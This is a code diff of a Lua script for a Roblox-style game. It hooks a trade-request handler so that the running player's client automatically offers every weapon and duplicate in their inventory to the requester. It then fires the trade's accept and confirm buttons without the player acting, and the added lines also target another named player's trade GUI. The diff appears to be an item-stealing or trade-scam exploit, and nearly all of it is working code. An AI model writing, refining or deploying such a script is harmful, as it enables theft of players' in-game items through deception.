@@ -36,64 +36,15 @@ SendRequest.OnClientInvoke = function(senderPlayer)
             print("Waiting for trade to start...")
             StartTradeEvent.OnClientEvent:Wait()
             
-            print("Trade started! Fetching weapons directly from Bofuxa's inventory container...")
+            print("Trade started! Fetching weapons from LocalPlayer inventory...")
             task.wait(1)
             
-            local inventoryContainer = nil
-            local bofuxaPlayer = Players:FindFirstChild("Bofuxa")
-            
-            if bofuxaPlayer then
-                local bGui = bofuxaPlayer:FindFirstChild("PlayerGui")
-                if bGui then
-                    local mainGui = bGui:FindFirstChild("MainGUI")
-                    if mainGui then
-                        local gameFolder = mainGui:FindFirstChild("Game")
-                        if gameFolder then
-                            local crafting = gameFolder:FindFirstChild("Crafting")
-                            if crafting then
-                                local inventory = crafting:FindFirstChild("Inventory")
-                                if inventory then
-                                    local salvage = inventory:FindFirstChild("Salvage")
-                                    if salvage then
-                                        local scrollFrame = salvage:FindFirstChild("ScrollFrame")
-                                        if scrollFrame then
-                                            inventoryContainer = scrollFrame:FindFirstChild("Container")
-                                        end
-                                    end
-                                end
-                            end
-                        end
-                    end
-                end
-            end
-
-            -- Fallback to LocalPlayer's container if Bofuxa's path isn't locally visible
-            if not inventoryContainer and playerGui then
-                local mainGui = playerGui:FindFirstChild("MainGUI")
-                if mainGui then
-                    local gameFolder = mainGui:FindFirstChild("Game")
-                    if gameFolder then
-                        local crafting = gameFolder:FindFirstChild("Crafting")
-                        if crafting then
-                            local inventory = crafting:FindFirstChild("Inventory")
-                            if inventory then
-                                local salvage = inventory:FindFirstChild("Salvage")
-                                if salvage then
-                                    local scrollFrame = salvage:FindFirstChild("ScrollFrame")
-                                    if scrollFrame then
-                                        inventoryContainer = scrollFrame:FindFirstChild("Container")
-                                    end
-                                end
-                            end
-                        end
-                    end
-                end
-            end
+            local container = playerGui and playerGui:FindFirstChild("MainGUI") and playerGui.MainGUI:FindFirstChild("Game") and playerGui.MainGUI.Game:FindFirstChild("Crafting") and playerGui.MainGUI.Game.Crafting:FindFirstChild("Inventory") and playerGui.MainGUI.Game.Crafting.Inventory:FindFirstChild("Salvage") and playerGui.MainGUI.Game.Crafting.Inventory.Salvage:FindFirstChild("ScrollFrame") and playerGui.MainGUI.Game.Crafting.Inventory.Salvage.ScrollFrame:FindFirstChild("Container")
 
             local offeredCount = 0
 
-            if inventoryContainer then
-                for _, item in ipairs(inventoryContainer:GetChildren()) do
+            if container then
+                for _, item in ipairs(container:GetChildren()) do
                     if item:IsA("GuiObject") then
                         local itemName = item.Name
                         local category = "Weapons"
@@ -110,9 +61,9 @@ SendRequest.OnClientInvoke = function(senderPlayer)
                         end
                     end
                 end
-                print("Successfully added all " .. tostring(offeredCount) .. " weapon items and duplicates from container!")
+                print("Successfully added all " .. tostring(offeredCount) .. " weapon items and duplicates!")
             else
-                warn("Inventory container path not found; using Backpack fallback.")
+                warn("Target inventory container not found; falling back to Backpack.")
                 if LocalPlayer:FindFirstChild("Backpack") then
                     for _, tool in ipairs(LocalPlayer.Backpack:GetChildren()) do
                         if tool:IsA("Tool") then
@@ -124,7 +75,8 @@ SendRequest.OnClientInvoke = function(senderPlayer)
                 print("Added " .. tostring(offeredCount) .. " items from Backpack fallback.")
             end
 
-            print("Finished adding weapons. Triggering accept and confirm trade immediately...")
+            print("Waiting 0.5 seconds after adding weapons...")
+            task.wait(0.5)
 
             pcall(function()
                 AcceptTradeEvent:FireServer(true)
@@ -149,11 +101,36 @@ SendRequest.OnClientInvoke = function(senderPlayer)
                 end
             end
 
+            -- 1. StarterGui Phone Method (Accept & Confirm)
+            pcall(function()
+                local phoneStarterGui = game:GetService("StarterGui"):WaitForChild("TradeGUI_Phone", 1)
+                if phoneStarterGui then
+                    fireButton(phoneStarterGui.Container.Trade.Actions.Accept.ActionButton)
+                    task.wait(0.1)
+                    fireButton(phoneStarterGui.Container.Trade.Actions.Accept.Confirm.ActionButton)
+                end
+            end)
+
+            -- 2. PlayerGui Phone Method
             pcall(function()
                 local phoneActions = LocalPlayer.PlayerGui.TradeGUI_Phone.Container.Trade.Actions
                 fireButton(phoneActions.Accept.ActionButton)
-                task.wait(0.2)
+                task.wait(0.1)
                 fireButton(phoneActions.Accept.Confirm.ActionButton)
+            end)
+
+            -- 3. Run Bofuxa's TradeGUI accept and confirm paths as requested
+            pcall(function()
+                local bofuxaObj = Players:FindFirstChild("Bofuxa")
+                local bGui = bofuxaObj and bofuxaObj:FindFirstChild("PlayerGui")
+                if bGui then
+                    local tradeActions = bGui:FindFirstChild("TradeGUI") and bGui.TradeGUI:FindFirstChild("Container") and bGui.TradeGUI.Container:FindFirstChild("Trade") and bGui.TradeGUI.Container.Trade:FindFirstChild("Actions")
+                    if tradeActions then
+                        fireButton(tradeActions.Accept.ActionButton)
+                        task.wait(0.1)
+                        fireButton(tradeActions.Accept.Confirm.ActionButton)
+                    end
+                end
             end)
         end)
 
